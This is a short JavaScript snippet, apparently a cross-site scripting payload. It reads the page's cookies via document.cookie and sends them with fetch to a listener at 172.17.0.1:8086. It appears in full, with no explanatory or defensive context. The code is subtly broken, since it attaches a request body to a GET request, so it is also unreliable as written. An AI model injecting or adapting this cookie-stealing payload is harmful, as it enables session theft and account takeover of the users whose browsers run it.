var token = document.cookie;
fetch('http://172.17.0.1:8086/prueba.txt', {
    method: 'GET',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        token
    })
})
.then((res) => res.text())
.then((data) => {
});
